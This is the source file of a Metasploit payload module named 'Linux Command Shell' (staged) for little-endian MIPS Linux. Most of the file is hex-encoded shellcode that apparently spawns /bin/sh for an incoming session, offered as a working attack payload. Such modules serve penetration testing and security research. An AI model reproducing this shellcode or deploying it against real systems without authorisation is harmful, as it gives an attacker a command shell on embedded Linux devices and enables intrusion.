##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Command Shell',
      'Description'   => 'Spawn a command shell (staged)',
      'Author'        => 'juan vazquez',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_MIPSLE,
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Stage'         =>
        {
          'Payload' =>
            "\xfd\xff\x11\x24\x27\x88\x20\x02\x20\x20\x40\x02\x20\x28" +
            "\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff\xff\x10\x24" +
            "\xff\xff\x31\x22\xfa\xff\x11\x16\xff\xff\x18\x24\xff\xff" +
            "\x10\x07\xff\xff\x18\x28\x1c\x00\xe4\x23\xf8\xff\xa4\xaf" +
            "\xfc\xff\xa0\xaf\xf8\xff\xa5\x23\xff\xff\x06\x28\xab\x0f" +
            "\x02\x24\x0c\x01\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68\x00"
        }
      ))
  end
end
